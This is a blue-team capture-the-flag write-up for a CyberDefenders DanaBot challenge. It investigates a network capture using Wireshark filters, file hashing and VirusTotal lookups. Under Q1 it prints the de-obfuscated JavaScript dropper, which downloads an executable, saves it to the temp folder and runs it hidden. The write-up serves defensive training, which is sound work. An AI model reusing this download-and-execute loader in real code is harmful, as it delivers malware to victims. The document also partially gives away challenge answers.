https://cyberdefenders.org/blueteam-ctf-challenges/danabot

Scenario:
>The SOC team has detected suspicious activity in the network traffic, revealing that a machine has been compromised. Sensitive company information has been stolen. Your task is to use Network Capture (PCAP) files and Threat Intelligence to investigate the incident and determine how the breach occurred.

**Q1. What is the name of the malicious file used for initial access?**

I used the following query to find HTTP responses containing file downloads:

```
http.response.code == 200 && http.content_type
```

From the results available only one of them was clearly a malicious file (an obfuscated javascript file and a DLL). Here's the de-obfuscated result of the former:

```
function generateRandomName(length) {
    var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result + ".exe";
}
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");
var tempFolder = fso.GetSpecialFolder(2);
var randomExe = generateRandomName(10);
var exePath   = tempFolder + "\\" + randomExe;
var http = WScript.CreateObject("MSXML2.XMLHTTP");
var obfuscatedUrl = "ueNcGq";  

http.Open("GET", obfuscatedUrl, false);
http.Send();

if (http.Status == 200) {
    var stream = WScript.CreateObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile(exePath, 2);
    stream.Close();
    
    shell.Run(exePath, 0, true);
}

shell.Run(WScript.ScriptFullName);
```

This looks malicious!

**Q2. What is the SHA-256 hash of the malicious file used for initial access?**

I exported the file (Export Objects > HTTP... > select file), then ran `sha256sum login.php` on my device to find the hash.

**Q3. Which process was used to execute the malicious file?**

We can infer this from the code: WScript.***

**Q4. What is the file extension of the second malicious file utilized by the attacker?**

We know this from the other suspicious file available for export. To confirm, I exported it, obtained the hash, and looked it up: https://www.virustotal.com/gui/file/2597322a49a6252445ca4c8d713320b238113b3b8fd8a2d6fc1088a5934cee0e Turns out this is actually an executable!

**Q5. What is the MD5 hash of the second malicious file?**

I leave this as an exercise for the reader.

**Q6. Which IP address was used by the attacker during the initial access?**

Thanks to the list of Contacted IP addresses in the VirusTotal Relations section, I was able to figure this out. However, it is just a SYN packet without a reply.

**Q7. What is the final malicious IP address, found in the PCAP, that is used as the command and control (C2) server by DanaBot?**

I also learned this from the list of VT IP addresses.
